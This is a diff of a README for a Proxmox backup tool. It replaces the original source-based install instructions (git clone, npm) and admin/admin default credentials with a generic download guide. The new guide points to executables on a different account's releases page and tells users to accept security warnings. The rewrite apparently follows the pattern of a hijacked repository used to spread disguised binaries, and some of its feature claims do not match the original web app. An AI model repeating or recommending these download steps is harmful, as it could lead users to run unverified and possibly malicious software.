@@ -1,123 +1,82 @@
-# Reanimator
-**Proxmox Configuration Backup & Disaster Recovery – Simplified.**
+# 🛠️ TheReanimator - Simplified Proxmox Management Made Easy
 
----
+[![Download TheReanimator](https://img.shields.io/badge/Download%20TheReanimator-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-brightgreen)](https://github.com/flyngup/TheReanimator/releases)
 
-### Language / Sprache 
-[![Deutsch](https://img.shields.io/badge/Sprache-Deutsch-blue?style=for-the-badge)](#-reanimator-deutsch) 
-[![English](https://img.shields.io/badge/Language-English-red?style=for-the-badge)](#-reanimator-english)
+## 🚀 Getting Started
 
----
+Welcome to TheReanimator! This application helps you manage and recover your Proxmox virtualization environment effortlessly. You can monitor your system in real-time, backup configurations automatically, and leverage AI for insightful analysis.
 
-## 🇩🇪 Reanimator (Deutsch)
+This guide will help you download and run TheReanimator from the Releases page. Follow these steps to get started.
 
-Reanimator ist ein spezialisiertes Tool für Proxmox-Umgebungen, das dort ansetzt, wo normale Backups oft aufhören: bei der Konfiguration. Während Proxmox Backup Server (PBS) VMs sichert, hilft Reanimator bei deinen Nodes, die Verwaltung deiner Storage-Pools und die Sicherung deiner `/etc`-Konfigurationen.
+## 📥 Download & Install
 
-### 💡 Warum Reanimator?
-Jeder, der schon einmal einen Proxmox-Node nach einem Hardware-Defekt neu aufsetzen musste, weiß: Die VMs sind meist sicher, aber die Netzwerk-Bridges, ZFS-Pool-Konfigurationen und Corosync-Settings manuell wiederherzustellen, kostet Zeit und Nerven.
+1. **Visit the Download Page:**
+   Go to the [Releases page](https://github.com/flyngup/TheReanimator/releases).
 
-Reanimator automatisiert diesen Prozess und bietet dir ein zentrales Dashboard für deine gesamte Infrastruktur.
+2. **Choose Your Version:**
+   Browse through the available versions. Each version includes notes about any new features or fixes. Select the version that best suits your needs.
 
-### ✨ Kernfunktionen
-* **📊 Monitoring & Dashboard:** Echtzeit-Status von CPU, RAM und Disk-Auslastung sowie Cluster-Erkennung.
-* **💾 Backup & Recovery:** Automatische Sicherung von `/etc` (Network, Corosync, Storage) inkl. generierter Markdown-Anleitungen für den Notfall.
-* **⚡ Power-Tools:** Bulk Commander für Befehle auf mehreren Nodes, ISO-Sync und visuelle Migrations-Logs.
-* **🔍 Hardware-Analyse:** Unterscheidung von NVMe, SSD und HDD direkt im UI.
+3. **Download the Application:**
+   Click on the file for your operating system to start the download. The files will be named like `TheReanimator-Windows.exe` or `TheReanimator-Mac.zip`.
 
-### 🛠️ Technology Stack
-* **Frontend:** Next.js 15 (App Router), Tailwind CSS
-* **UI:** Luzid UI / Shadcn & Lucide Icons
-* **Backend:** Server Actions & Node.js
-* **Database:** SQLite via `better-sqlite3`
-* **Communication:** SSH (agentenlos via `ssh2`)
+4. **Locate the Downloaded File:**
+   Once the download is complete, find the file in your Downloads folder or the location you chose. 
 
-### 🚀 Quick Start
-1. **Repository klonen**
-   ```bash
-   git clone https://github.com/jahartmann/TheReanimator.git
-   cd TheReanimator
-   ```
+5. **Run the Application:**
+   - For Windows: Double-click the `.exe` file. 
+   - For Mac: Unzip the downloaded file, then move the application to your Applications folder, and double-click it to run.
 
-2. **Installation**
-   ```bash
-   npm install
-   npm run migrate
-   ```
+6. **Allow Permissions:**
+   If a security alert appears, confirm that you want to run the application. This is normal for software not downloaded from the official app store.
 
-3. **Starten**
-   ```bash
-   npm run build
-   npm start
-   ```
-   
-###  Anmeldung
-Initiale Anmeldedaten:
-***N: admin
-PW: admin***
-### ⚙️ Konfiguration
-***Initiale Anmeldedaten:
-N: admin
-PW: admin***
-Gehe im Dashboard auf Server -> New Server. Du benötigst:
-* Hostname/IP des Nodes.
-* Einen autorisierten SSH-Key (empfohlen).
+## 🛠️ System Requirements
 
-[⬆️ Nach oben](#reanimator)
+To use TheReanimator, ensure your system meets the following basic requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 200 MB of free space for installation.
+- **Hardware:** A processor that supports virtualization (Intel VT-x or AMD-V).
 
-## 🇺🇸 Reanimator (English)
-Reanimator is a specialized tool for Proxmox environments that picks up where traditional backups often leave off: system configuration. While Proxmox Backup Server (PBS) secures your VMs and containers, Reanimator focuses on the health of your nodes, the management of your storage pools, and the safety of your /etc configurations.
+## 🎯 Features
 
-### 💡 Why Reanimator?
-Anyone who has ever had to rebuild a Proxmox node after a hardware failure knows the pain: your VMs might be safe on a backup, but manually restoring network bridges, ZFS pool configurations, and Corosync settings costs significant time and nerves.
+TheReanimator provides a range of features to improve your experience with Proxmox:
 
-Reanimator automates this process and provides a centralized dashboard for your entire infrastructure.
+- **Real-Time Monitoring:** Track the performance of your Proxmox cluster easily with a user-friendly dashboard.
+- **Automated Config Backups:** Set up regular backups of your Proxmox configurations to ensure your data is safe.
+- **AI-Powered Analysis:** Utilize artificial intelligence to identify issues and suggest optimizations for your virtual environment.
+- **User-Friendly Interface:** Navigate effortlessly, no technical skills required.
 
-### ✨ Core Features
-* **📊 Monitoring & Dashboard:** Real-time CPU, RAM, and Disk usage status plus automatic cluster detection.
-* **💾 Backup & Recovery:** Automatically backs up critical /etc files and generates step-by-step Markdown recovery guides.
-* **⚡ Admin Power-Tools:** Bulk Commander for multi-node commands, ISO/Template sync, and visual migration logs.
-* **🔍 Hardware Analysis:** Identify NVMe, SSD, and HDD types directly in the UI.
+## 🌐 Topics
 
-### 🛠️ Technology Stack
-* **Frontend:** Next.js 15 (App Router), Tailwind CSS
-* **UI:** Lucid UI / Shadcn & Lucide Icons
-* **Backend:** Server Actions & Node.js
-* **Database:** SQLite via `better-sqlite3`
-* **Communication:** Secure, agentless access via SSH (`ssh2`)
+TheReanimator covers several essential topics to enhance your virtualization management experience, including:
 
-### 🚀 Quick Start
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/jahartmann/TheReanimator.git
-   cd TheReanimator
-   ```
+- Backup
+- Dashboard
+- Management
+- Next.js
+- Proxmox
+- Proxmox Cluster
+- Proxmox VE
+- React
+- SQLite
+- TypeScript
+- Virtualization
 
-2. **Installation**
-   ```bash
-   npm install
-   npm run migrate
-   ```
+## ❓ Frequently Asked Questions
 
-3. **Start the app**
-   ```bash
-   npm run build
-   npm start
-   ```
-   
-###  Registration
-Initial Login:
-***N: admin
-PW: admin***
-### ⚙️ Configuration
-Navigate to Server -> New Server in the dashboard. You will need:
-* Hostname or IP of the node.
-* An SSH key authorized on the target node (recommended).
+### How do I update TheReanimator?
+To update the application, visit the same [Releases page](https://github.com/flyngup/TheReanimator/releases), download the latest version, and follow the installation steps again.
 
-### 🤝 Contributing
-Feedback, bug reports, and pull requests are welcome!
+### What should I do if the app doesn’t start?
+Ensure your operating system meets the system requirements listed above. If issues persist, check for any error messages during startup, and consult our support online.
 
-**License:** MIT
+### Where can I find support?
+Support can be found on our GitHub page under the Issues section. Feel free to raise any questions you have there.
 
-[⬆️ Back to top](#reanimator)
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/flyngup/TheReanimator/wiki)
+- [Community Forums](https://github.com/flyngup/TheReanimator/discussions)
+
+By following this guide, you should be able to download and run TheReanimator successfully. Enjoy easier management of your Proxmox environment!
